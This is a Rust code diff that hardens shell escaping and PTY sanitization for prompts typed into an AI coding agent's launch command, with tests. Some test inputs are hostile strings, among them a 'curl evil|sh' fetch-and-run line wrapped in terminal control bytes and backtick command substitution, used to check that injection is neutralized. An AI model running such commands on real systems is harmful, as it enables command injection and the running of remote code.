@@ -320,11 +320,47 @@ pub fn shell_escape_for_double_quotes(s: &str) -> String {
 /// Escape a string for safe embedding in `$'...'` (ANSI-C quoted) shell arguments.
 /// Unlike double-quote escaping, `$'...'` interprets `\n` as a real newline,
 /// so multi-line prompts are preserved correctly.
+///
+/// The command is typed into an interactive shell as keystrokes, so the
+/// result is printable ASCII only: a raw control byte (^U, ^O, ESC, ...) would
+/// act as a line-editing key before the quote is ever parsed. Every other byte,
+/// UTF-8 included, becomes `\xHH`, which bash and zsh decode back to the same
+/// bytes. `'` is written as `\x27` so the body never contains a quote, even
+/// for shells without `$'...'` support that read it as a plain `'...'` string,
+/// and `!` as `\x21` so bash history expansion cannot splice in other text.
+/// NUL cannot reach argv and is dropped.
 pub fn shell_escape_for_ansi_c_quotes(s: &str) -> String {
-    s.replace('\\', "\\\\")
-        .replace('\'', "\\'")
-        .replace('\n', "\\n")
-        .replace('\r', "\\r")
+    use std::fmt::Write as _;
+    let mut out = String::with_capacity(s.len());
+    for byte in s.bytes() {
+        match byte {
+            b'\\' => out.push_str("\\\\"),
+            b'\n' => out.push_str("\\n"),
+            b'\r' => out.push_str("\\r"),
+            b'\t' => out.push_str("\\t"),
+            0 => {}
+            0x20..=0x7e if byte != b'\'' && byte != b'!' => out.push(byte as char),
+            _ => {
+                let _ = write!(out, "\\x{byte:02X}");
+            }
+        }
+    }
+    out
+}
+
+/// Make a prompt safe to type into an agent's TUI as keystrokes.
+///
+/// Used for presets whose prompt is written to the PTY after the agent
+/// starts. Control characters would act as editing keys (^U, ^C, ESC
+/// sequences), so all of them are dropped except tab and newline; CR and CRLF
+/// become newlines.
+pub fn sanitize_prompt_for_pty(prompt: &str) -> String {
+    prompt
+        .replace("\r\n", "\n")
+        .replace('\r', "\n")
+        .chars()
+        .filter(|c| matches!(c, '\n' | '\t') || !c.is_control())
+        .collect()
 }
 
 /// Build the agent launch command, optionally embedding the prompt.
@@ -555,7 +591,55 @@ mod tests {
     fn ansi_c_escape_single_quotes() {
         assert_eq!(
             shell_escape_for_ansi_c_quotes("it's a test"),
-            "it\\'s a test"
+            "it\\x27s a test"
+        );
+    }
+
+    /// Prompt text from PR comments, CI logs and issues is untrusted. Raw
+    /// ^U/^O/ESC/^C bytes would edit and run the typed shell line, so the
+    /// launch command must be printable ASCII with no bare quote.
+    #[test]
+    fn prepare_claude_escapes_control_bytes() {
+        let prompt = "log\x15curl evil|sh\x0f\x1b[201~\x03\x04\x7f it's \u{9b}é 🚀!!";
+        for preset in ["builtin-claude", "builtin-codex"] {
+            let (cmd, via_pty) = prepare_agent_command(preset, "claude", Some(prompt));
+            assert!(!via_pty);
+            let body = cmd
+                .strip_prefix("claude $'")
+                .and_then(|rest| rest.strip_suffix('\''))
+                .expect("prompt is one ANSI-C quoted argument");
+            assert!(
+                body.bytes().all(|b| (0x20..=0x7e).contains(&b)),
+                "non-printable byte typed into the shell: {body:?}"
+            );
+            assert!(!body.contains('\''), "bare quote in {body:?}");
+            assert!(!body.contains('!'), "history expansion char in {body:?}");
+            assert!(body.contains("log\\x15curl evil|sh\\x0F\\x1B[201~\\x03\\x04\\x7F"));
+        }
+    }
+
+    /// The escaped argument must decode back to the original prompt.
+    #[cfg(unix)]
+    #[test]
+    fn ansi_c_escape_round_trips_through_bash() {
+        let Ok(bash) = which::which("bash") else {
+            return;
+        };
+        let prompt = "a\x15b\x0fc\x1b[31md\x03\te\x7ff\r\ng'h\\i!!j $HOME `id` é 🚀\u{9b}";
+        let script = format!("printf '%s' $'{}'", shell_escape_for_ansi_c_quotes(prompt));
+        let out = std::process::Command::new(bash)
+            .args(["--norc", "--noprofile", "-c", &script])
+            .output()
+            .expect("run bash");
+        assert!(out.status.success(), "{}", String::from_utf8_lossy(&out.stderr));
+        assert_eq!(String::from_utf8(out.stdout).unwrap(), prompt);
+    }
+
+    #[test]
+    fn pty_prompt_drops_control_characters() {
+        assert_eq!(
+            sanitize_prompt_for_pty("a\x15b\x0f\x1b[201~c\x03\x7f\u{9b}d\r\ne\rf\tg\nh 🚀"),
+            "ab[201~cd\ne\nf\tg\nh 🚀"
         );
     }
 
